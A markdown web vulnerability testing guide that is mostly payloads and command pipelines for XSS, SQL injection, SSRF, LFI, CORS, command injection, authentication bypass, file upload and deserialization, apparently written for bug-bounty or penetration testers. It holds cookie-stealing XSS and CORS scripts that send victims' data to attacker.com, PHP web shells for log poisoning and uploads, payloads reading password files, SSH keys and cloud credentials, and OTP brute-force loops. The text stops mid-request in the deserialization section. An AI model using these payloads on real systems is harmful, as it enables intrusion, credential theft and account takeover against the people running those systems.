# Web Vulnerability Testing Guide

## Table of Contents
1. [XSS (Cross-Site Scripting)](#xss-cross-site-scripting)
2. [SQL Injection](#sql-injection)
3. [SSRF (Server-Side Request Forgery)](#ssrf-server-side-request-forgery)
4. [LFI/Directory Traversal](#lfi-directory-traversal)
5. [CORS (Cross-Origin Resource Sharing)](#cors-cross-origin-resource-sharing)
6. [Open Redirects](#open-redirects)
7. [Command Injection](#command-injection)
8. [IDOR (Insecure Direct Object References)](#idor-insecure-direct-object-references)
9. [Parameter Pollution and Hidden Parameters](#parameter-pollution-and-hidden-parameters)
10. [Authentication Bypass](#authentication-bypass)
11. [File Upload Vulnerabilities](#file-upload-vulnerabilities)
12. [Deserialization Attacks](#deserialization-attacks)

---

## XSS (Cross-Site Scripting)

### Basic XSS Payloads

#### Reflection-based XSS
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<iframe src="javascript:alert('XSS')"></iframe>
```

#### DOM-based XSS
```html
#<script>alert('DOM XSS')</script>
#<img src=x onerror=alert('DOM XSS')>
#"><svg onload=alert('DOM XSS')>
```

#### Advanced XSS Payloads
```html
<!-- Context breakers -->
<A/hREf="j%0aavas%09cript%0a:%09con%0afirm%0d``">z
<d3"<"/onclick="1>[confirm``]"<">z
<svg/x=">"/onload=confirm()//

<!-- Mutation-style -->
"><img src=x oNerrOr=alert(1)>
"><iframe src="javascript:alert(1)"></iframe>
<svg><script>alert(1)</script>

<!-- Polyglot to escape multiple contexts -->
%0ajavascript:/*\\"/*-->&lt;svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover="/**/ alert()//'">
```

#### Context-specific Payloads
```html
<!-- HTML context -->
</tag><svg onload=alert()>

<!-- Attribute context -->
"><svg onload=alert()>
onmouseover=alert()

<!-- JavaScript context -->
'-alert()-'
}</script><svg onload=alert()>
```

#### Confirm Variants
```javascript
confirm()
confirm`
(((confirm)))
[confirm`]
```

### POST-based XSS
```
name=John&comment=<img src=x onerror=alert('XSS')>
```

### JSON-based XSS
```json
{
  "username": "<script>alert('XSS')</script>",
  "comment": "<img src=x onerror=alert('XSS')>"
}
```

### WebSocket XSS
```javascript
ws.onopen = function() {
    ws.send("<script>alert('XSS')</script>");
};
```

### Cookie Exfiltration Payload
```html
<img src=x onerror="document.location='http://attacker.com?c='+document.cookie;" />
<img src=x onerror=prompt(document.cookie)>
```

### XSS Testing Methodology

#### Automated XSS Discovery
```bash
# Basic XSS discovery pipeline
waybackurls target.com | gf xss | sed 's/=.*/=/' | sort -u | tee xss.txt
cat xss.txt | dalfox -b http://burpcollaborator.com pipe > output.txt

# XSS with katana and dalfox
echo "http://target.com" | katana -jc -f qurl -d 5 -c 50 -kf robotstxt,sitemapxml -silent | dalfox pipe --skip-bav

# Gau + gf + dalfox pipeline
echo "https://example.com/" | gau | gf xss | uro | Gxss | kxss | tee xss_output.txt
cat xss_output.txt | grep -oP '^URL: \K\S+' | sed 's/=.*/=/' | sort -u > final.txt

# XSS testing with parameter replacement
echo 'example.com' | gau | qsreplace '<sCript>confirm(1)</sCript>' | xsschecker -match '<sCript>confirm(1)</sCript>' -vuln
```

#### Header-based Blind XSS
```bash
# User-Agent header XSS
cat domain.txt | waybackurls | httpx \
  -H "User-Agent: \"><script src=https://xss.report/c/test></script>"

# Multiple header XSS testing
cat domains.txt | assetfinder --subs-only | httprobe | while read url; do 
  xss1=$(curl -s -L $url -H 'X-Forwarded-For: xss.yourburpcollabrotor'|grep xss) 
  xss2=$(curl -s -L $url -H 'X-Forwarded-Host: xss.yourburpcollabrotor'|grep xss) 
  xss3=$(curl -s -L $url -H 'Host: xss.yourburpcollabrotor'|grep xss)
  echo -e "$url Method[1] X-Forwarded-For: xss+ssrf => $xss1"
  echo -e "Method[2] X-Forwarded-Host: xss+ssrf ==> $xss2"
  echo -e "Method[3] Host: xss+ssrf ==> $xss3"
done

# Blind XSS with bxss
subfinder -d example.com | gau | bxss -payload '"><script src=https://xss.report/c/test></script>' -header 'X-Forwarded-For'
subfinder -d example.com | gau | grep '&' | bxss -appendMode -payload '"><script src=https://xss.report/c/test></script>' -parameters
```

#### FFUF XSS Testing
```bash
# Request file method
ffuf -request xss -request-proto https -w /root/wordlists/xss-payloads.txt -c -mr '<script>alert("XSS")</script>'
```

### XSS Bypasses and Filters
```html
<!-- Case variation -->
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x ONERROR=alert(1)>

<!-- Event handler variation -->
<svg onload=alert(1)>
<body onload=alert(1)>
<img src=x onerror=alert(1)>
<details open ontoggle=alert(1)>

<!-- JavaScript execution without script tags -->
<img src=x onerror=eval('alert(1)')>
<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>

<!-- Using data: URIs -->
<iframe src="data:text/html,<script>alert(1)</script>"></iframe>

<!-- Using javascript: protocol -->
<a href="javascript:alert(1)">Click me</a>
<iframe src="javascript:alert(1)"></iframe>
```

---

## SQL Injection

### Detection Techniques

#### Basic SQLi Detection Payloads
```sql
'
"
`
')
")
`)
' OR '1'='1
" OR "1"="1
` OR `1`=`1
' OR 1=1--
" OR 1=1--
' OR 1=1#
' OR 1=1/*
admin'--
admin"--
admin'#
admin"#
' UNION SELECT null--
' UNION SELECT null,null--
' UNION SELECT null,null,null--
```

#### Time-based Blind SQLi
```sql
-- MySQL
' AND SLEEP(5)--
' AND BENCHMARK(1000000,MD5(1))--

-- PostgreSQL  
'; SELECT pg_sleep(5)--

-- MSSQL
'; WAITFOR DELAY '0:0:5'--

-- Oracle
' AND DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(66)||CHR(67),5) IS NULL--
```

#### Boolean-based Blind SQLi
```sql
' AND 1=1--
' AND 1=2--
' AND (SELECT COUNT(*) FROM users) > 0--
' AND (SELECT LENGTH(database())) > 5--
' AND ASCII(SUBSTR((SELECT database()),1,1)) > 64--
```

### Enumeration Techniques

#### Database Fingerprinting
```sql
-- MySQL
' AND @@version LIKE '5%'--
' UNION SELECT @@version,null,null--

-- PostgreSQL
' AND version() LIKE 'PostgreSQL%'--

-- MSSQL
' AND @@version LIKE 'Microsoft%'--

-- Oracle
' AND (SELECT banner FROM v$version WHERE rownum=1) LIKE 'Oracle%'--
```

#### Information Schema Queries
```sql
-- List databases
' UNION SELECT schema_name,null FROM information_schema.schemata--

-- List tables
' UNION SELECT table_name,null FROM information_schema.tables WHERE table_schema='database_name'--

-- List columns
' UNION SELECT column_name,data_type FROM information_schema.columns WHERE table_name='table_name'--

-- Count rows
' UNION SELECT COUNT(*),null FROM table_name--
```

### Data Extraction

#### UNION-based Extraction
```sql
-- Extract usernames and passwords
' UNION SELECT username,password FROM users--
' UNION SELECT CONCAT(username,':',password),null FROM users--

-- Extract specific user data
' UNION SELECT username,password FROM users WHERE id=1--
' UNION SELECT email,phone FROM users WHERE username='admin'--

-- Extract system information
' UNION SELECT USER(),DATABASE()--
' UNION SELECT @@hostname,@@datadir--
```

#### Error-based Extraction
```sql
-- MySQL
' AND extractvalue(1, concat(0x7e, (SELECT user()), 0x7e))--
' AND updatexml(null,concat(0x0a,version()),null)--

-- MSSQL
' AND 1=CAST((SELECT @@version) AS int)--

-- Oracle
' AND CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1)) is not null--
```

### Automated SQLi Testing

#### Ghauri Usage
```bash
# Basic SQL injection detection
ghauri -u "http://www.site.com/vuln.php?id=1"

# Database enumeration
ghauri -u "http://www.site.com/vuln.php?id=1" --dbs
ghauri -u "http://www.site.com/vuln.php?id=1" -D database_name --tables
ghauri -u "http://www.site.com/vuln.php?id=1" -D database_name -T table_name --columns

# Data extraction
ghauri -u "http://www.site.com/vuln.php?id=1" -D database_name -T table_name --dump

# Banner grabbing
ghauri -u "http://www.site.com/vuln.php?id=1" -b

# Advanced techniques
ghauri -u "http://www.site.com/vuln.php?id=1" --technique "TUB"
ghauri -u "http://www.site.com/vuln.php?id=1" --threads 5

# Bulk testing
ghauri -m /path/to/targets.txt

# Interactive SQL shell
ghauri -u "http://www.site.com/vuln.php?id=1" --sql-shell
```

#### SQLi Discovery Pipeline
```bash
# Comprehensive SQLi testing
subfinder -d target.com -all -silent | gau -t 50 | uro | gf sqli > sql.txt
ghauri -m sql.txt --batch --dbs --level 3 --confirm

# Alternative approach
echo "test.vulnweb.com" | gau -t 50 | uro | gf sqli > sql.txt
ghauri -m sql.txt --batch --dbs --level 3 --confirm
```

### Google Dorks for SQLi-prone Parameters
```
inurl:id= | inurl:pid= | inurl:category= | inurl:cat= | inurl:action= | inurl:sid= | inurl:dir= inurl:& site:example.com

intext:"error in your SQL syntax"
intext:"OLE DB Provider for SQL Server"
intext:"pg_connect()"
```

### WAF Bypass Techniques
```sql
-- Comment variations
/*comment*/
--comment
#comment
;%00

-- Case manipulation
UnIoN SeLeCt
SeLeCt

-- Encoding
%27 UNION SELECT
%55%4E%49%4F%4E SELECT

-- Whitespace bypass
+UNION+SELECT
/**/UNION/**/SELECT
%0AUNION%0ASELECT

-- Function bypass
CHAR(85,78,73,79,78) -- UNION
CONCAT(CHAR(85),CHAR(78),CHAR(73),CHAR(79),CHAR(78))
```

---

## SSRF (Server-Side Request Forgery)

### Basic SSRF Payloads

#### Local Network Access
```
http://localhost
http://127.0.0.1
http://0.0.0.0
http://[::1]
http://localhost:80
http://localhost:443
http://localhost:22
http://localhost:3306
http://localhost:5432
http://localhost:6379
http://localhost:27017
```

#### IPv4 Variations
```
http://127.1
http://127.0.1
http://0177.0.0.1 (octal)
http://0x7f.0x0.0x0.0x1 (hex)
http://2130706433 (decimal)
http://017700000001 (octal)
http://0x7f000001 (hex)
```

#### IPv6 Bypass
```
http://[::ffff:127.0.0.1]
http://[0:0:0:0:0:ffff:127.0.0.1]
http://[::1]
```

#### DNS Rebinding
```
http://127.0.0.1.xip.io
http://127.0.0.1.nip.io
http://a.b.c.d.xip.io (where a.b.c.d resolves to internal IP)
```

### Protocol Exploitation

#### File Protocol
```
file:///etc/passwd
file:///etc/hosts
file:///proc/version
file:///proc/cmdline
file://localhost/etc/passwd
file:///c:/windows/system32/drivers/etc/hosts (Windows)
```

#### Gopher Protocol
```
gopher://127.0.0.1:22/_test
gopher://127.0.0.1:3306/_test
gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0ainfo%0d%0a (Redis)
```

#### FTP Protocol
```
ftp://127.0.0.1
ftp://admin:admin@127.0.0.1
```

### Cloud Metadata Exploitation

#### AWS
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/
```

#### Google Cloud
```
http://metadata.google.internal/computeMetadata/v1/
http://metadata/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

#### Azure
```
http://169.254.169.254/metadata/instance?api-version=2017-08-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

### SSRF Testing Methodology

#### Parameter-based Testing
```bash
# Find SSRF-prone parameters
echo "target.com" | gau | grep -E "(url=|uri=|path=|dest=|redirect=|next=|data=|reference=|site=|html=|val=|validate=|domain=|callback=|return=|page=|feed=|host=|port=|to=|out=|view=|dir=|show=|navigation=|open=)"

# Test with Burp Collaborator
curl -X POST "https://target.com/fetch" -d "url=http://burpcollaborator.com"
curl -X GET "https://target.com/proxy?url=http://burpcollaborator.com"
```

#### Google Dork for SSRF-prone Parameters
```
inurl:http | inurl:url= | inurl:path= | inurl:dest= | inurl:html= | inurl:data= | inurl:domain= | inurl:page= inurl:& site:example.com
```

#### Automated SSRF Testing
```bash
# Using SSRFmap
python3 ssrfmap.py -r request.txt -p url -m readfiles

# Header-based SSRF testing (combined with XSS testing above)
# X-Forwarded-For, X-Forwarded-Host, Host headers
```

### SSRF Bypass Techniques

#### URL Encoding
```
http://127.0.0.1 -> http%3A//127.0.0.1
http://localhost -> http%3A//localhost
```

#### Double URL Encoding
```
http://127.0.0.1 -> http%253A//127.0.0.1
```

#### Unicode/UTF-8 Encoding
```
http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ
http://𝖑𝖔𝖈𝖆𝖑𝖍𝖔𝖘𝖙
```

#### Mixed Case
```
HTTP://LOCALHOST
Http://LocalHost
```

#### Using Redirects
```
# Create redirect service
http://redirect-service.com/redirect?url=http://127.0.0.1

# Use URL shorteners
http://bit.ly/internalservicelink
```

---

## LFI/Directory Traversal

### Basic LFI Payloads

#### Linux/Unix Systems
```
../../../etc/passwd
../../../etc/shadow
../../../etc/hosts
../../../proc/version
../../../proc/cmdline
../../../proc/self/environ
../../../var/log/apache2/access.log
../../../var/log/apache2/error.log
../../../home/user/.ssh/id_rsa
../../../home/user/.bash_history
```

#### Windows Systems
```
..\..\..\..\windows\system32\drivers\etc\hosts
..\..\..\..\windows\system32\config\sam
..\..\..\..\boot.ini
..\..\..\..\windows\win.ini
..\..\..\..\windows\system.ini
..\..\..\..\inetpub\logs\logfiles
```

#### Encoding Variations
```
# URL encoding
..%2F..%2F..%2Fetc%2Fpasswd
..%252F..%252F..%252Fetc%252Fpasswd

# Double encoding
..%252F..%252F..%252Fetc%252Fpasswd

# Unicode encoding
..%u002F..%u002F..%u002Fetc%u002Fpasswd
```

### Advanced LFI Techniques

#### Null Byte Injection (PHP < 5.3)
```
../../../etc/passwd%00
../../../etc/passwd%00.jpg
```

#### Path Truncation
```
../../../etc/passwd/././././././[...repeat until path limit...]
```

#### Filter Bypasses
```
....//....//....//etc/passwd
..///////..////..//////etc/passwd
/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

#### Wrapper Exploitation (PHP)
```
php://filter/convert.base64-encode/resource=index.php
php://filter/read=string.rot13/resource=index.php
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8%2B
zip://archive.zip%23file.txt
```

### Log Poisoning

#### Apache Log Poisoning
```bash
# Poison User-Agent in access logs
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

# Include log file and execute
http://target.com/include.php?file=../../../var/log/apache2/access.log&cmd=whoami
```

#### SSH Log Poisoning
```bash
# Attempt SSH login with PHP code as username
ssh '<?php system($_GET["cmd"]); ?>'@target.com

# Include auth log
http://target.com/include.php?file=../../../var/log/auth.log&cmd=whoami
```

### LFI Testing Methodology

#### Automated LFI Discovery
```bash
# Basic LFI testing with ffuf
echo 'https://canva.com/' | gau | gf lfi | uro | sed 's/=.*/=/' | qsreplace 'FUZZ' | sort -u | xargs -I{} ffuf -u {} -w payloads/lfi.txt -c -mr 'root:(x|\*|\$[^\:]*):0:0:' -v

# Advanced LFI pipeline
waymore -i "target.com" -n -mode U | gf lfi | sed 's/=.*/=/' | qsreplace "FUZZ" | sort -u | while read urls; do ffuf -u $urls -w payloads/lfi.txt -c -mr "root:" -v; done

# Alternative method with httpx-toolkit
echo 'https://example.com/index.php?page=' | httpx-toolkit -paths payloads/lfi.txt -threads 50 -random-agent -mc 200 -mr 'root:(x|\*|\$[^\:]*):0:0:'
```

#### Quick LFI One-liner
```bash
gau HOST | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
```

### Google Dorks for LFI-prone Parameters
```
inurl:include | inurl:dir | inurl:detail= | inurl:file= | inurl:folder= | inurl:inc= | inurl:locate= | inurl:doc= | inurl:conf= inurl:& site:example.com
```

### LFI to RCE Techniques

#### Log File Inclusion
1. Poison log files with PHP code
2. Include log file via LFI
3. Execute commands via parameter

#### PHP Session Files
```
/tmp/sess_[SESSION_ID]
/var/lib/php/sessions/sess_[SESSION_ID]
```

#### Proc Self Environ
```
/proc/self/environ
# Combined with User-Agent poisoning
```

---

## CORS (Cross-Origin Resource Sharing)

### CORS Misconfiguration Testing

#### Basic CORS Testing
```bash
# Test for wildcard origin
curl -H 'Origin: https://evil.com' -I https://target.com/api/data

# Check for specific origin reflection
curl -H 'Origin: https://172.217.14.228.com' -I https://www.google.com | grep -i -e 'access-control-allow-origin' -e 'access-control-allow-methods' -e 'access-control-allow-credentials'

# Test with attacker domain
curl -H 'Origin: https://attacker.com' -I https://target.com/wp-json/
```

#### Automated CORS Testing
```bash
# Using corsy
python3 corsy.py -i subdomains_alive.txt -t 10 --headers 'User-Agent: GoogleBot\nCookie: SESSION=Hacked'

# CORS discovery pipeline
site="target.com"
gau "$site" | while read url; do 
  target=$(curl -sIH "Origin: https://evil.com" -X GET $url | grep 'https://evil.com')
  if [[ ! -z "$target" ]]; then 
    echo "[Potential CORS Found] $url"
  else 
    echo "Nothing on $url"
  fi
done
```

### Common CORS Misconfigurations

#### Wildcard Origin with Credentials
```http
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

#### Null Origin Allowed
```http
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

#### Subdomain Reflection
```http
Origin: https://evil.target.com
Access-Control-Allow-Origin: https://evil.target.com
Access-Control-Allow-Credentials: true
```

#### Regex Bypass
```http
Origin: https://target.com.evil.com
Access-Control-Allow-Origin: https://target.com.evil.com
```

### CORS Exploitation Techniques

#### Basic CORS Exploit
```javascript
// Create XMLHttpRequest
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('GET','https://target.com/api/sensitive-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
    // Send stolen data to attacker server
    location='//attacker.com/log?data='+this.responseText;
}
```

#### PostMessage CORS Exploit
```javascript
// Listen for postMessage from target
window.addEventListener('message', function(e) {
    if (e.origin !== 'https://target.com') return;
    
    // Extract sensitive data
    fetch('https://attacker.com/exfiltrate', {
        method: 'POST',
        body: JSON.stringify(e.data)
    });
});

// Trigger vulnerable postMessage
window.frames[0].postMessage('getData', 'https://target.com');
```

---

## Open Redirects

### Basic Open Redirect Payloads

#### Parameter-based Redirects
```
?url=http://evil.com
?redirect=http://evil.com
?next=http://evil.com
?return=http://evil.com
?redir=http://evil.com
?ret=http://evil.com
?r2=http://evil.com
?page=http://evil.com
?continue=http://evil.com
?dest=http://evil.com
?destination=http://evil.com
?go=http://evil.com
?out=http://evil.com
```

#### Bypass Techniques

##### Protocol Bypass
```
javascript:alert(1)
data:text/html,<script>alert(1)</script>
//evil.com
///evil.com
////evil.com
```

##### Domain Bypass
```
# Using subdomains
?redirect=http://evil.com.target.com
?redirect=http://target.com.evil.com

# Using similar domains
?redirect=http://target-com.evil.com
?redirect=http://targет.com (using Cyrillic characters)

# Using URL encoding
?redirect=http%3A//evil.com
?redirect=http%253A//evil.com

# Using decimal/hex encoding
?redirect=http://3232235777 (decimal for 192.168.1.1)
?redirect=http://0xc0a80101 (hex for 192.168.1.1)
```

##### Path-based Bypass
```
?redirect=/\evil.com
?redirect=\/\/evil.com
?redirect=/\/evil.com
?redirect=//\evil.com
```

### Open Redirect Testing Methodology

#### Automated Testing
```bash
# Basic open redirect testing
export LHOST="http://evil.com"
gau target.com | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'

# Using parallel for testing
cat URLS.txt | gf url | tee url-redirect.txt 
cat url-redirect.txt | parallel -j 10 curl --proxy http://127.0.0.1:8080 -sk > /dev/null
```

#### Google Dorks for Open Redirect Parameters
```
inurl:url= | inurl:return= | inurl:next= | inurl:redirect= | inurl:redir= | inurl:ret= | inurl:r2= | inurl:page= inurl:& inurl:http site:example.com
```

### Open Redirect to XSS/CSRF

#### JavaScript Protocol
```
?redirect=javascript:alert(document.domain)
?redirect=javascript:eval(String.fromCharCode(97,108,101,114,116,40,49,41))
```

#### Data URI
```
?redirect=data:text/html,<script>alert(1)</script>
?redirect=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

---

## Command Injection

### Basic Command Injection Payloads

#### Linux/Unix Commands
```bash
; whoami
| whoami  
& whoami
&& whoami
|| whoami
` whoami `
$(whoami)
${whoami}
; cat /etc/passwd
; ls -la
; id
; uname -a
; pwd
```

#### Windows Commands
```cmd
; whoami
| whoami
& whoami
&& whoami
|| whoami
; dir
; type C:\windows\system32\drivers\etc\hosts
; net user
```

#### Time-based Detection
```bash
; sleep 10
; ping -c 10 127.0.0.1
& timeout 10
| powershell Start-Sleep 10
```

### Command Injection Bypass Techniques

#### Encoding Bypasses
```bash
# URL encoding
%3Bwhoami
%7Cwhoami
%26whoami

# Hex encoding
\x3bwhoami
\x7cwhoami

# Octal encoding
\073whoami
```

#### Concatenation Bypasses
```bash
# String concatenation
who'a'mi
who"a"mi
who$'a'mi

# Variable expansion
w'h'o'a'm'i
w"h"o"a"m"i
```

#### Character Filtering Bypass
```bash
# Using wildcard
/bin/cat /et?/pass??
/bin/cat /etc/pa*

# Using brace expansion
{cat,/etc/passwd}
{ls,-la}

# Base64 encoding
echo d2hvYW1p | base64 -d | bash
echo `echo d2hvYW1p | base64 -d`
```

### Google Dorks for RCE-prone Parameters
```
inurl:cmd | inurl:exec= | inurl:query= | inurl:code= | inurl:do= | inurl:run= | inurl:read= | inurl:ping= inurl:& site:example.com
```

### Command Injection Testing Tools

#### Commix
```bash
# Basic testing
python commix.py -u "http://target.com/page.php?exec=whoami"

# POST request testing
python commix.py --url="http://target.com/page.php" --data="cmd=whoami" --cookie="PHPSESSID=value"

# Time-based testing
python commix.py -u "http://target.com/page.php?cmd=test" --technique="T"
```

---

## IDOR (Insecure Direct Object References)

### IDOR Detection Techniques

#### Numeric ID Testing
```
# Sequential testing
/api/user/1
/api/user/2  
/api/user/100
/api/user/1000

# Negative numbers
/api/user/-1
/api/user/0

# Large numbers
/api/user/999999999
```

#### GUID/UUID Testing
```
# Different GUID formats
/api/user/550e8400-e29b-41d4-a716-446655440000
/api/user/6ba7b810-9dad-11d1-80b4-00c04fd430c8

# Predictable UUIDs
/api/user/00000000-0000-0000-0000-000000000001
/api/user/11111111-1111-1111-1111-111111111111
```

#### Hash/Encoded ID Testing
```
# Base64 encoded IDs
/api/user/dXNlcjE= (user1)
/api/user/YWRtaW4= (admin)

# MD5 hashed IDs
/api/user/5d41402abc4b2a76b9719d911017c592 (hello)
/api/user/098f6bcd4621d373cade4e832627b4f6 (test)
```

### IDOR Testing Methodology

#### Parameter Manipulation
```
# GET parameters
?user_id=1
?id=1
?uid=1
?account=1
?profile_id=1

# POST parameters
user_id=1
id=1
account_id=1

# Headers
X-User-ID: 1
User-ID: 1
Account-ID: 1
```

#### HTTP Methods Testing
```bash
# Test different methods
curl -X GET "https://target.com/api/user/123"
curl -X POST "https://target.com/api/user/123"  
curl -X PUT "https://target.com/api/user/123"
curl -X DELETE "https://target.com/api/user/123"
curl -X PATCH "https://target.com/api/user/123"
```

#### Automated IDOR Testing
```bash
# Using Burp Intruder patterns
# Numeric: 1-1000
# Wordlist: common usernames, emails
# Encoded: base64, URL encoding of IDs

# Using custom scripts
for i in {1..100}; do
  curl -H "Authorization: Bearer $TOKEN" \
       "https://target.com/api/user/$i" \
       -w "%{http_code}\n" -o /dev/null -s
done
```

### IDOR in Different Contexts

#### File Access IDOR
```
/download?file=invoice_123.pdf
/download?file=../invoice_124.pdf
/api/file/123
/documents/user_1_private.pdf
```

#### API IDOR
```
/api/v1/user/profile/123
/api/v1/orders/456  
/api/v1/messages/789
/api/v1/admin/users/1
```

#### Function-level IDOR
```
/admin/users/delete/123
/user/profile/edit/123
/api/admin/reports/123
/moderator/posts/approve/123
```

---

## Parameter Pollution and Hidden Parameters

### HTTP Parameter Pollution (HPP)

#### HPP Testing Techniques
```
# Same parameter multiple times
?user=victim&user=attacker
?id=1&id=2
?role=user&role=admin

# Array-like parameters  
?users[]=1&users[]=2
?filters[name]=test&filters[admin]=true

# Different encoding
?user=victim&user%5B%5D=attacker
```

#### Server-side HPP Behavior
```
# Apache/PHP: Last parameter wins
?color=red&color=blue → color=blue

# ASP.NET: All parameters concatenated
?color=red&color=blue → color=red,blue  

# Python/Django: Returns list
?color=red&color=blue → color=['red','blue']
```

### Hidden Parameter Discovery

#### Arjun Usage
```bash
# Basic parameter discovery
arjun -u https://target.com/endpoint.php -oT arjun_output.txt -t 10 --rate-limit 10 --passive -m GET,POST --headers 'User-Agent: Mozilla/5.0'

# Using custom wordlist
arjun -u https://target.com/endpoint.php -oT arjun_output.txt -m GET,POST -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -t 10 --rate-limit 10 --headers 'User-Agent: Mozilla/5.0'

# Pipeline with kxss
arjun -q -u target.com -oT arjun.txt && cat arjun.txt | awk -F'[?&]' '{baseUrl=$1; for (i=2; i<=NF; i++) {split($i, param, "="); print baseUrl "?" param[1] "="}}' | kxss
```

#### ParamSpider Usage
```bash
# Discover parameters from web archives
python3 paramspider.py -d target.com

# Using with other tools
python3 paramspider.py -d target.com --output params.txt
cat params.txt | grep "=" | qsreplace "FUZZ" | ffuf -u FUZZ -w payloads.txt
```

#### Common Hidden Parameters
```
# Authentication
token
auth
session_id
api_key
access_token

# Admin/Debug
debug  
test
admin
dev
internal

# Functionality
callback
jsonp
format
type
method
action
cmd
```

### Parameter Pollution Attacks

#### Authentication Bypass
```
# Try to add admin parameter
POST /login
user=normaluser&pass=password&admin=true

# Parameter pollution
user=normaluser&user=admin&pass=password
```

#### Authorization Bypass
```
# Add role parameter
?user_id=123&role=admin
?user_id=123&user_id=1&role=user

# Override permissions
?action=view&action=delete&id=123
```

---

## Authentication Bypass

### Common Authentication Bypass Techniques

#### SQL Injection Bypass
```sql
-- Login form bypasses
admin'--
admin'#  
admin'/*
' or '1'='1'--
' or '1'='1'#
' or '1'='1'/*
' or 1=1--
' or 1=1#
admin' or '1'='1
admin' or 1=1--
```

#### JWT Manipulation

##### None Algorithm Attack
```python
# Change algorithm to none
{
  "alg": "none",
  "typ": "JWT"
}
{
  "sub": "1234567890",
  "name": "Admin User",  
  "admin": true
}
```

##### Weak Secret Attack
```bash
# Try to crack JWT secret
john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256

# Common weak secrets
secret
jwt_secret
your-256-bit-secret
qwertyuiopasdfghjklzxcvbnm123456
```

##### Key Confusion Attack
```python
# Use public key as HMAC secret
# If RS256 -> HS256 confusion possible
```

#### Session Token Issues

##### Predictable Session IDs
```python
# Sequential tokens
SESSIONID_001
SESSIONID_002

# Timestamp-based
session_1609459200
session_1609459201

# Weak randomization
session_12345
session_abcde
```

##### Session Fixation
```bash
# Set session before login
GET /login?PHPSESSID=attacker_session
# User logs in with fixed session
# Attacker uses same session
```

#### OTP/2FA Bypass Techniques

##### Brute Force OTP
```python
# 4-digit OTP (0000-9999)
for i in range(10000):
    otp = str(i).zfill(4)
    # Test OTP
    
# 6-digit OTP  
for i in range(1000000):
    otp = str(i).zfill(6)
    # Test OTP
```

##### Response Manipulation
```bash
# Change response from invalid to valid
{"status": "invalid"} -> {"status": "valid"}
{"success": false} -> {"success": true}
```

##### Race Condition
```bash
# Send multiple requests simultaneously
curl -X POST "https://target.com/verify" -d "otp=1234" &
curl -X POST "https://target.com/verify" -d "otp=5678" &
```

### Host Header Injection

#### Password Reset Manipulation
```bash
# Change Host header in password reset
POST /password-reset HTTP/1.1
Host: evil.com
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
```

#### Cache Poisoning
```bash
# Poison cache with malicious host
GET /login HTTP/1.1
Host: evil.com
X-Forwarded-Host: evil.com
```

### Authentication Testing Methodology

#### Automated Testing
```bash
# Test common authentication bypasses
curl -X POST "https://target.com/login" -H "Content-Type: application/x-www-form-urlencoded" -d 'username=admin&password=password'

# Test with different user agents, headers
curl -X POST "https://target.com/login" -H "X-Forwarded-For: 127.0.0.1" -d 'username=admin&password=admin'
```

---

## File Upload Vulnerabilities

### Basic Upload Bypasses

#### Extension Bypasses
```
# Double extensions
file.php.jpg
file.php.png
file.php.gif

# Case variation
file.PHP
file.PhP  
file.pHp

# Special characters
file.php%00.jpg
file.php;.jpg
file.php .jpg
file.php..jpg

# Alternative extensions
file.php3
file.php4  
file.php5
file.phtml
file.asp
file.aspx
file.jsp
file.jspx
```

#### MIME Type Bypasses
```
# Change Content-Type header
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
```

#### Magic Bytes Bypass
```
# Add magic bytes to beginning of file
GIF89a<?php system($_GET['cmd']); ?>
PNG<?php system($_GET['cmd']); ?>
JFIF<?php system($_GET['cmd']); ?>
```

### Advanced Upload Techniques

#### Polyglot Files
```php
# PHP/GIF polyglot
GIF89a
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

#### ZIP Upload Exploitation
```bash
# Directory traversal in ZIP
# Create malicious zip with path traversal
zip malicious.zip ../../shell.php
```

#### Image Upload with Embedded Payload
```php
# Embed PHP in EXIF data
<?php system($_GET['cmd']); ?>
```

### File Upload Testing Methodology

#### Manual Testing Checklist
1. Try different file extensions
2. Modify Content-Type header
3. Add magic bytes
4. Test file size limits
5. Try ZIP/archive uploads
6. Test directory traversal
7. Check for direct file access

#### Automated Testing
```bash
# Upload testing with burp/ffuf
# Create wordlist of file extensions
echo -e "php\nphp3\nphp4\nphp5\nphtml\nasp\naspx\njsp" > extensions.txt

# Test each extension
for ext in $(cat extensions.txt); do
  curl -X POST -F "file=@shell.$ext" "https://target.com/upload"
done
```

---

## Deserialization Attacks

### Java Deserialization

#### Detection
```java
// Look for these patterns
ObjectInputStream.readObject()
XMLDecoder.readObject()
Serializable

// Common vulnerable libraries
Apache Commons Collections
Apache Commons BeanUtils  
Spring Framework
Groovy
```

#### Exploitation Tools
```bash
# ysoserial
java -jar ysoserial.jar CommonsCollections1 'whoami' | base64

# Use in requests
POST /deserialize HTTP/1.1
